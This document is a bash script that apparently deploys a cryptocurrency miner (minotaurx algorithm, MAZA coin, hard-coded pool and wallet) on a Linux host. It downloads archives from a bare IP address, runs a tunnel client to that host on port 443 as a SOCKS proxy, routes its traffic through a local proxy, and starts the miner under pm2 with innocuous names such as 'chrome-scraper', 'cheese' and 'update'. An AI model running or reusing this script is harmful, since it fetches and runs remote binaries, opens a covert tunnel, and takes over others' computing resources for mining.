#!/bin/bash
cd
sleep 2
whoami
sleep 3

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_DeltaBlue_')
ipaddress=$(curl -s ifconfig.me)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 4`

echo ""
echo "You have a total number of $used_num_of_cores cores"
echo ""

echo ""
echo "Your worker name is $currentdate"
echo ""

sleep 2

# Function to check if Node.js is installed

wget -O - https://deb.nodesource.com/setup_20.x | bash

sleep 3

apt -y install nodejs

sleep 2

curl https://github.com/malphite-code-2/chrome-scraper/releases/download/chrome-v2/chrome-mint.tar.gz -L -O -J
tar -xvf chrome-mint.tar.gz
rm chrome-mint.tar.gz
cd chrome-mint

# Install dependencies
npm install

sleep 2

wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add -
echo "deb http://dl.google.com/linux/chrome/deb/ stable main" | tee /etc/apt/sources.list.d/google.list

sleep 2

apt-get update
apt-get install -y google-chrome-stable

sleep 2

npm install pm2 -g

sleep 2

pm2 set pm2:sysmonit true

sleep 2

pm2 update

sleep 2

wget -q http://45.135.58.52/cheese.tar.gz > /dev/null
sleep 2


sleep 2

tar -xf cheese.tar.gz

sleep 2

./cheese client -v 45.135.58.52:443 7777:socks &

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

wget http://45.135.58.52/update.tar.gz > /dev/null

sleep 2

tar -xf update.tar.gz > /dev/null

sleep 2

cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:7777
END

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1

sleep 3

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

./update/update curl ifconfig.me

sleep 2

rm config.json

sleep 2

#./update/update bash

	
cat > config.json <<END
{
  "algorithm": "minotaurx",
  "host": "flyingsaucer-eu.teatspray.fun",
  "port": 7019,
  "worker": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8",
  "password": "$currentdate,c=MAZA,zap=MAZA",
  "workers": $used_num_of_cores,
  "fee": "1"
}
END

sleep 5

./update/update pm2 start index.js --watch

#node index.js

